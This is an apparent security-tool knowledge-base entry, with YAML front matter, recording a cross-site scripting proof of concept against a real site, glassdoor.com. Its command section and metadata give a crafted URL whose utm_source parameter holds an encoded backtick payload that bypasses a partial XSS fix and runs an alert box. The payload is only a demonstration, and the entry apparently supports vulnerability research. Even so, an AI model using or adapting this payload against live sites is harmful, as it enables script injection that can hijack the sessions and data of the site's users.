---
data: >-
  # Use browser to visit:

  https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60
tags:
  - xss
  - bypass
  - poc
type: command
executor: bash
platforms:
  - Web
id: f85531b4-f9fb-4e30-9517-610dafe966e0
created_at: '2025-12-11T06:10:28.637Z'
updated_at: '2025-12-11T06:10:28.637Z'
verified: false
validated: true
submitted: true
---
# access-backtick-xss-poc-url

## Command

```bash
# Use browser to visit:
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60
```

## Description

This command accesses a proof-of-concept URL to bypass a partial XSS fix using backticks, injecting a payload that executes an alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The full bypass POC URL with backtick payload | Yes |

## Examples

### Basic Usage

```bash
# Open in browser
```

## Expected Output

An alert box displaying '1' in the browser window.

## Related

- [[procedures/Bypass-Partial-XSS-Fix-with-Backticks]]
- [[commands/access-xss-poc-url]]
